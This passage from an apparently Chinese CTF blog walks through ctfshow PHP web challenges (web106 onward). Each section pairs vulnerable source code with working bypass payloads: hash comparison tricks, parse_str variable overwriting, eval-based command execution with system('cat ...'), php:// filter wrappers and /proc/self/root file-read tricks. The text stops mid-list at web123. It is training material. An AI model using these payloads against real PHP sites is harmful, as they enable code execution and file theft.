<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>与web104类似，只不过初始值不能相同</p>
</li>
<li><p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: v2[]=0</span><br><span class="line">POST: v1[]=1</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>parse_str()函数<br>将字符串解析成多个变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">parse_str(string $string, array &amp;$result): void</span><br><span class="line">如果 string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。</span><br><span class="line">警告</span><br><span class="line">极度不建议在没有 result 参数的情况下使用此函数， 并且在 PHP 7.2 中将废弃不设置参数的行为。PHP 8.0.0 起，result 参数是强制的。</span><br></pre></td></tr></table></figure>
<p><a href="https://www.php.net/manual/zh/function.parse-str.php">示例</a></p>
</li>
<li><p>isset()函数<br>检测变量是否已声明并且其值不为 null。</p>
</li>
<li><p>empty与isset的区别<br>empty - 检查一个变量是否为空<br>isset - 检查一个变量是否为null<br><code>为空</code> 包含了 <code>为null</code> 这个概念，<br>这些变量均认为是空： <code>&#39;&#39;  0  0.0  &quot;0&quot;  null  false  array()  $var;</code><br><code>为null</code> 只有<strong>变量未声明</strong>和<strong>赋为null</strong>这两种。</p>
</li>
<li><p>$_POST<br>不能用empty()函数和isset()函数判断传入的值是否为空，因为$_POST是一个数组，里边有键名和键值。<br>只要传入了变量，即使没有值也会被函数认定为有值。</p>
</li>
</ul>
<p>可以看出，本题的考点是变量覆盖（parse_str）和md5<br>通过POST传入v1，通过GET传入v3。通过parse_str将v1传入的键名转化为变量名，传入的键值转化为变量的值，放入数组v2中，实现变量覆盖。<br>然后将变量名为flag的值与v3的md5值相比较，如果相等则输出flag。</p>
<ol start="2">
<li>构造payload</li>
</ol>
<ul>
<li><p>方法一<br>GET：<br><code>v3=1</code><br>POST:<br><code>v1=flag=c4ca4238a0b923820dcc509a6f75849b</code><br>解释：<br>1的md5值为：c4ca4238a0b923820dcc509a6f75849b<br>因此相比较时能过，拿到flag</p>
</li>
<li><p>方法二<br>GET：<br><code>v3[]=</code><br>POST:<br><code>v1=</code><br>解释：<br>v3传入数组会返回空值，即MD5值也为空。而v1没有传入变量到v2，因此v2[‘flag’]也为空。<br>两边均为空，返回true，拿到flag。</p>
</li>
</ul>
<h1 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>ereg()函数<br>正则表达式匹配(PHP 4, PHP 5)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ereg ( string $pattern , string $string [, array &amp;$regs ] ) : int</span><br><span class="line">以区分大小写的方式在 string 中寻找与给定的正则表达式 pattern 所匹配的子串。</span><br></pre></td></tr></table></figure>
<p><a href="http://php.adamharvey.name/manual/zh/function.ereg.php">ereg函数详细解释</a></p>
</li>
<li><p>$ 正则<br>匹配输入字符串的结尾位置。</p>
</li>
</ul>
<p>第1个if语句的意思是，匹配GET传入的参数c首尾是否有字母，没有将会直接退出。<br>第2个if语句的意思是，将变量c的值逆转再取整判断是否等于16进制的0x36d，也即10进制的877。如果等于将输出flag。</p>
<ol start="2">
<li>构造payload<br>因为ereg函数存在截断漏洞，%00后的字符串不解析，由此我们可以构造：<br><code>aa%00778</code><br>成功拿到flag。</li>
</ol>
<h1 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>Exception异常类<br><a href="https://learnku.com/articles/5435/exceptions-and-errors-in-php-best-practices">Exception异常类</a><br>源码来看，可以得知是需要通过GET方式传入v1，v2两个参数，由于有preg_match()函数检验，因此两个参数都需要有字母才能通过匹配。<br>最后通过eval变成可执行代码。</li>
</ul>
<ol start="2">
<li>构造payload<br>我们需要构造出不会报错，并且能够显示所需信息的payload，关键是在于变量v1使用什么函数。<br>这里有三种函数可用：<br><code>?v1=Exception&amp;v2=system(&#39;ls&#39;)</code><br><code>?v1=ReflectionClass&amp;v2=system(&#39;ls&#39;)</code><br><code>?v1=ReflectionMethod&amp;v2=system(&#39;ls&#39;)</code><br>找到含有flag的文件后，继续执行如下命令显示flag：<br><code>?v1=Exception&amp;v2=system(&#39;cat fl36dg.txt&#39;)</code><br><code>?v1=ReflectionClass&amp;v2=system(&#39;cat fl36dg.txt&#39;)</code><br><code>?v1=ReflectionMethod&amp;v2=system(&#39;cat fl36dg.txt&#39;)</code><br>显示源码，成功拿到flag。</li>
</ol>
<h1 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>FilesystemIterator<br>FilesystemIterator是文件系统迭代器，利用 FilesystemIterator 获取指定目录下的所有文件<br><a href="https://www.php.net/manual/zh/class.filesystemiterator.php">详细解释</a></p>
</li>
<li><p>getcwd()函数<br>取得当前工作目录<a href="https://blog.csdn.net/baidu_35085676/article/details/52002579">getcwd()函数</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getcwd(): string|false</span><br><span class="line">成功则返回当前工作目录，失败返回 false。</span><br><span class="line">在某些 Unix 的变种下，如果任何父目录没有设定可读或搜索模式，即使当前目录设定了，getcwd() 还是会返回 false。</span><br></pre></td></tr></table></figure></li>
</ul>
<p>和前一关类似，但是设置了黑名单，不能使用符号和数字，只能使用字母或空格。</p>
<ol start="2">
<li>构造payload<br>这里考察了：php内置类。我们需要用到FilesystemIterator来或取指定目录下的所有文件，并且使用getcwd()函数获取当前工作目录后返回当前工作目录<br><code>?v1=FilesystemIterator&amp;v2=getcwd</code><br>所需文件出现后，直接加在url之后访问即可拿到flag</li>
</ol>
<h1 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>$GLOBALS（不可小写）<br>超全局变量：引用全局作用域中可用的全部变量。<br>说明：<br>关联数组 array，包含当前脚本内定义成全局范围的所有变量的引用。 数组的键就是变量的名字。$GLOBALS在PHP中总是可用的。<br><a href="https://www.php.net/manual/zh/reserved.variables.globals.php">GLOBALS更详细的解释</a></li>
</ul>
<p>通过GET传入两个参数v1,v2，并且只能传入字母。如果检查到v1中有ctfshow，则执行函数getflag。<br>将v2的值传给v1，并且通过var_dump函数输出v1</p>
<ol start="2">
<li>构造payload<br>由于v1&#x3D;ctfshow，因此实际起作用的只有v2<br>我们需要用到超全局变量$GLOBALS，于是构造出payload为：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure>
成功拿到flag</li>
</ol>
<h1 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>is_file()函数<br>判断给定文件名是否为一个正常的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">is_file(string $filename): bool</span><br><span class="line">如果文件存在且为正常的文件则返回 true，否则返回 false。</span><br><span class="line">注意: 因为 PHP 的整数类型是有符号整型而且很多平台使用 32 位整型，对 2GB 以上的文件，一些文件系统函数可能返回无法预期的结果。</span><br></pre></td></tr></table></figure>
</li>
<li><p>伪协议<br><a href="https://www.php.net/manual/zh/wrappers.php">支持的协议和封装协议</a></p>
</li>
</ul>
<p>通过GET方式传入一个参数file，判断是否为文件类型且进行了黑名单过滤。</p>
<ol start="2">
<li>构造payload<br>可以使用伪协议绕过is_file和highlight_file函数，于是有以下两种构造方法：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br><span class="line"></span><br><span class="line">?file=compress.zlib://flag.php</span><br></pre></td></tr></table></figure>
成功拿到flag</li>
</ol>
<h1 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>is_file()目录溢出漏洞<br>linux里 <code>/proc/self/root</code> 是指向根目录的，也就是如果在命令行中输入<code>ls /proc/self/root</code> ，其实显示的内容是根目录下的内容<br>多次重复后绕过 <code>is_file</code><br><code>/proc/self</code> 指向当前进程的 <code>/proc/pid/</code> , <code>/proc/self/root</code> 是一个指向 <code>/</code> 的软连接<br><a href="https://www.anquanke.com/post/id/213235">参考文章</a></li>
</ul>
<p>本题的源代码与上一题相比，在 <code>preg_match</code> 处增加了filter这个过滤器，那么无法使用php伪协议。</p>
<ol start="2">
<li>构造payload<br>还能使用的是这个payload：<br><code>?file=compress.zlib://flag.php</code><br>还有另一种目录溢出的方法：<br><code>?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code><br>成功拿到flag</li>
</ol>
<h1 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没有什么好说的，和前两题比较相似，区别在于增加了过滤compress, root zip等等，不过没有再过滤filter，于是可以老办法。</p>
</li>
<li><p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>
<p>成功拿到flag</p>
</li>
</ol>
<h1 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>trim()函数<br>去除字符串首尾处的空白字符（或者其他字符）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">trim(string $string, string $characters = &quot; \n\r\t\v\x00&quot;): string</span><br><span class="line">此函数返回字符串 string 去除首尾空白字符后的结果。如果不指定第二个参数，trim() 将去除这些字符：</span><br><span class="line">&quot; &quot; (ASCII 32 (0x20))，普通空格符。</span><br><span class="line">&quot;\t&quot; (ASCII 9 (0x09))，制表符。</span><br><span class="line">&quot;\n&quot; (ASCII 10 (0x0A))，换行符。</span><br><span class="line">&quot;\r&quot; (ASCII 13 (0x0D))，回车符。</span><br><span class="line">&quot;\0&quot; (ASCII 0 (0x00))，空字节符。</span><br><span class="line">&quot;\v&quot; (ASCII 11 (0x0B))，垂直制表符。</span><br></pre></td></tr></table></figure></li>
</ul>
<p>过滤了以上不同进制，点号，科学计数法和加号等。我们通过实验发现，当is_numeric()函数判断 <code> 36</code> 时，依然会当作是数字，而在中间和最后插入符号则不会当作是数字，于是突破口可以选择在数字最前面插入某种符号来绕过。</p>
<ol start="2">
<li>构造payload<br>思路即为在数字前插入符号，但很多符号被trim函数过滤了，最终只有&#x2F;f（换页符）成功绕过<br>构造出payload如下：<br><code>?num=%0c36</code><br>成功拿到flag</li>
</ol>
<h1 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
